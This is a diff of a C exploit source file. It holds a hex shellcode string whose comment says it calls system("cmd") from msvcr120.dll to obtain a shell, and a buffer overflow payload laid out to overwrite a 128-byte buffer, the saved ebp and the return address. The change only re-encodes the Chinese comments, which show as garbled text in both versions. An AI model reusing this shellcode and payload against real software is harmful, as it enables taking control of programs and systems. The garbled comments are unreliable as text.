@@ -1,6 +1,6 @@
-/**
+ï»¿/**
  * shellcode:
- * µ÷ÓÃmsvcr120.dllÖĞµÄsystem("cmd")»ñµÃshell
+ * è°ƒç”¨msvcr120.dllä¸­çš„system("cmd")è·å¾—shell
  */
 char *shellcode =
 	"\xe8\xff\xff\xff\xff\xc2\x59\x90\x33\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x58"
@@ -12,5 +12,5 @@ char *shellcode =
 	"\x30\x2e\x64\x6c\x6c\x24"; // 120 bytes
 int shellcode_len = 120;
 
-char payload[128 + 4 + 4]; // 128 bytes¸²¸Çbuf, 4 bytes¸²¸Çebp, ×îºó4 bytes¸²¸Ç·µ»ØµØÖ·
+char payload[128 + 4 + 4]; // 128 bytesè¦†ç›–buf, 4 bytesè¦†ç›–ebp, æœ€å4 bytesè¦†ç›–è¿”å›åœ°å€
 int payload_len = sizeof(payload);
